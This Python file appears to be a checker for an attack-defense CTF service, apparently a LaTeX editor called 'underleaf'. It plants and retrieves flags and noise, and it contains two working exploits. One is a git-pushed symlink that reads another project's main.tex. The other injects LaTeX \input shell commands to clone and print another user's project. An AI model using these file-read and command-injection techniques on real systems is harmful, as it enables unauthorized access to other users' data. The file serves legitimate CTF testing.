import secrets
import json
import os
from typing import Optional, Tuple
from logging import LoggerAdapter
import hashlib

from enochecker3 import Enochecker, PutflagCheckerTaskMessage, GetflagCheckerTaskMessage, HavocCheckerTaskMessage, ExploitCheckerTaskMessage, PutnoiseCheckerTaskMessage, GetnoiseCheckerTaskMessage, ChainDB, MumbleException, FlagSearcher
from enochecker3.utils import assert_equals, assert_in
from util import *

checker = Enochecker("underleaf", service_port)
def app(): return checker.app

@checker.putflag(0)
async def putflag_zero(task: PutflagCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> str:
    (username, password, _, id) = await create_user_and_project(client, db, logger)

    flag_text = """\\documentclass[12pt]{minimal}
\\usepackage{verbatim}
\\begin{document}
""" + task.flag + """
\end{document}
"""

    path = await clone_project(username, password, id, task.address, logger)

    open(f"{path}/main.tex", "w").write(flag_text)
    await git_config_commit_and_push(path, username, "Minor changes to the layout.", logger)

    await cleanup_clone(path)

    await pull(client, id, logger)

    logger.info("putflag_zero: success")

    return id


@checker.getflag(0)
async def getflag_zero(task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> str:
    try:
        (username, password) = await db.get("credentials")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")

    await login_user(client, username, password, logger)

    try:
        (_, id) = await db.get("project")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")

    await compile(client, id, "main.tex", logger)
    pdf_bytes = await download_pdf(client, id, logger)
    
    file = f"/tmp/{id}.pdf"
    with open(file, "wb") as f:
        f.write(pdf_bytes)

    os_succ(os.system(f"pdftotext {file} {file}.txt"))
    
    with open(f"{file}.txt", "r") as f:
        output = f.read()

    os.remove(f"{file}.txt")
    os.remove(file)
    
    if task.flag not in output:
        raise MumbleException("Flag not found")

    logger.info("getflag_zero: success")


@checker.exploit(0)
async def exploit_zero(task: ExploitCheckerTaskMessage, client: AsyncClient, searcher: FlagSearcher, logger: LoggerAdapter) -> str:
    (username, password, _, id) = await create_user_and_project(client, None, logger)

    path = await clone_project(username, password, id, task.address, logger)

    assert_equals(os.path.exists(
        f"{path}/main.tex"), True, "file not created")

    # add a symlink
    f_id = task.attack_info

    target = f"/app/data/projects/{f_id[0:2]}/{f_id}/main.tex"
    os_succ(os.system(f"mkdir -p {target}/.. {dev_null}"))
    os_succ(os.system(f"touch {target} {dev_null}"))
    os_succ(os.system(f"ln -s {target} /tmp/{id}/link"))
    os_succ(os.system(f"rm -rf {target} {dev_null}"))

    await git_config_commit_and_push(path, username, "Exploit!", logger)

    await cleanup_clone(path)

    # let the server pull the changes
    await pull(client, id, logger)

    # get flag
    file = await download_file(client, id, "link", logger)
    if flag := searcher.search_flag(file):
        return flag

@checker.exploit(1)
async def exploit_one(task: ExploitCheckerTaskMessage, client: AsyncClient, searcher: FlagSearcher, logger: LoggerAdapter) -> str:
    (username, password, _, id) = await create_user_and_project(client, None, logger)

    f_id = task.attack_info

    commands = f"git clone http://nginx-git/{f_id}; cat ./{f_id}/main.tex"

    file_content = """\\documentclass[12pt]{minimal}
\\usepackage{verbatim}
\\begin{document}
    \\input{|"echo XGJlZ2lue3ZlcmJhdGltfQ== | base64 -d;""" + commands + """; echo XGVuZHt2ZXJiYXRpbX0= | base64 -d"}
\\end{document}
"""
    await upload_file(client, id, "main.tex", file_content, logger)
    await compile(client, id, "main.tex", logger)
    pdf_bytes = await download_pdf(client, id, logger)

    file = f"/tmp/{id}.pdf"
    with open(file, "wb") as f:
        f.write(pdf_bytes)

    os_succ(os.system(f"pdftotext {file} {file}.txt"))
    
    with open(f"{file}.txt", "r") as f:
        output = f.read()

    os.remove(f"{file}.txt")
    os.remove(file)
    
    if flag := searcher.search_flag(output):
        return flag

@checker.putnoise(0)
async def putnoise_file_content(task: PutnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter):
    (_, _, _, id) = await create_user_and_project(client, db, logger)

    noise_name = secrets.token_hex(16)
    noise = secrets.token_hex(32)

    await upload_file(client, id, noise_name, noise, logger)
    await db.set("noise", (noise_name, noise))
    logger.info("putnoise_file_content: success")


@checker.getnoise(0)
async def getnoise_file_content(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter):
    try:
        (username, password) = await db.get("credentials")
        (name, id) = await db.get("project")
        (noise_name, noise) = await db.get("noise")
    except KeyError:
        raise MumbleException("getnoise w/o putnoise")

    await login_user(client, username, password, logger)
    if await download_file(client, id, noise_name, logger) != noise:
        raise MumbleException()
    
    logger.info("getnoise_file_content: success")


if __name__ == "__main__":
    checker.run()
